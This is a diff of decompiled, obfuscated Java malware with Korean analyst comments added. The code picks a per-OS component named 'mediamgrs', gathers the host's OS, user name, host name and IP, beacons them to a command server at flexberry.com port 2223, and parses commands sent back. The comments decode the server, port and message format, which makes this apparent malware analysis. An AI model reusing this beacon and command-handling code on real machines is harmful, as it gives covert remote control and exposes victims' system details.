@@ -48,12 +48,14 @@ public class client {
          var16 = "mediamgrs";
          a.a var8;
          Object var19;
-         if ((var8 = a.c.b()).a() == a.c.a) {
-            var19 = new b.e(var16, var7, true);
+         
+         // 변수 3개로 var19를 초기화
+         if ((var8 = a.c.b()).a() == a.c.a) { 
+            var19 = new b.e(var16, var7, true); // 윈도우
          } else if (var8.a() == a.c.b) {
-            var19 = new b.c(var16, var7, true);
+            var19 = new b.c(var16, var7, true); // Mac
          } else if (var8.d() && !GraphicsEnvironment.getLocalGraphicsEnvironment().isHeadlessInstance()) {
-            var19 = new b.d(var16, var7, true);
+            var19 = new b.d(var16, var7, true); // Linux
          } else {
             if (!var8.d()) {
                throw new RuntimeException("Unknown operating system " + var8.c());
@@ -72,6 +74,7 @@ public class client {
          k.h.put("UID", k.g);
       }
 
+      // 유저 정보 (var3에 저장)
       var1 = System.getProperty("os.name");
       var2 = System.getProperty("os.version");
       var16 = System.getProperty("user.name");
@@ -82,19 +85,25 @@ public class client {
          try {
             while(true) {
                Socket var4;
-               (var4 = new Socket(k.b, k.c)).setSoTimeout(120000);
-               k.k = var4;
+               (var4 = new Socket(k.b, k.c)).setSoTimeout(120000); // k.b: "flexberry.com", k.c: 2223
+               k.k = var4; // Socket k
+               // k.g와 k.h는 위에서 __를 넣음
+               // k.m ~ k.z, k.A ~ k.J: @0000 ~ @0009, @0000 ~ @0013
+               // k.d: $#@ -> 파싱용인듯
+               // Preferences.userRoot().get("UID", (String)null)$#@@0000$#@[Host의 IP주소]$#@[OS 이름]$#@[OS버젼]$#@[User name]^Local Host의 Host name]$#@0.1$#@GROUP2$#@&&&
                (new DataOutputStream(var4.getOutputStream())).writeBytes(k.g + k.d + k.w + k.d + e.b() + k.d + var1 + k.d + var2 + k.d + var3 + k.d + k.i + k.d + k.j + k.d + "&&&");
+               // 위에서 쏘고 다시 무언가를 받는다.
                BufferedReader var5 = new BufferedReader(new InputStreamReader(var4.getInputStream()));
                PrintStream var6 = new PrintStream(var4.getOutputStream(), true);
 
                try {
                   while(true) {
-                     var16 = var5.readLine();
+                     var16 = var5.readLine(); // 받은 것은 읽어서 var16에 담는다.
 
                      try {
                         String[] var21;
-                        if ((var21 = var16.split("\\" + k.d))[0].equals(k.m)) {
+                        // k.d 즉, $#@으로 파싱한다.
+                        if ((var21 = var16.split("\\" + k.d))[0].equals(k.m)) { // @0000 인가?
                            new e();
                            e.a();
                            (new f()).start();
